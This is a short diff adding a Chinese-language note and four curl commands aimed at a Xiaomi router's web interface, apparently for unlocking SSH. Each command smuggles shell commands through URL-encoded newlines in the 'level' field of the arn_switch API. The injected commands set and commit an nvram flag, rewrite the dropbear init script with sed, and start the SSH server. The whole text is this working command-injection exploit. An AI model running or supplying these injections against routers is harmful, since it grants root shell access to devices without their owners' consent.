@@ -1,0 +1,6 @@
+你的stok每次路由器重启都会变，需要注意
+
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=你的stok/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20set%20ssh_en%3D1%0A"
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=你的stok/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20commit%0A"
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=你的stok/api/misystem/arn_switch -d "open=1&model=1&level=%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%0A"
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=你的stok/api/misystem/arn_switch -d "open=1&model=1&level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A"
